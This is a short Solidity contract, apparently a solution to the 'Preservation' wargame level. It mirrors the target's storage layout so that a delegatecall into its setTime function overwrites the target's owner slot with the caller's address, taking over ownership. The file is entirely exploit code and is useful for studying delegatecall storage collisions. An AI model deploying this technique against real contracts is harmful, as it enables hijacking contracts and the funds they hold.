// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract PreservationAttacker {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    error CallerIsNotOwnerThis();

    function setTime(uint256 _time) public onlyOwnerThis {
        storedTime = _time;
        owner = msg.sender;
    }

    function _requiresOwnerThis() private view {
        if (msg.sender != 0x4E269e03460719eC89Bb5e3B2610c7ba67BF900D) {
            revert CallerIsNotOwnerThis();
        }
    }

    modifier onlyOwnerThis() {
        _requiresOwnerThis();
        _;
    }
}
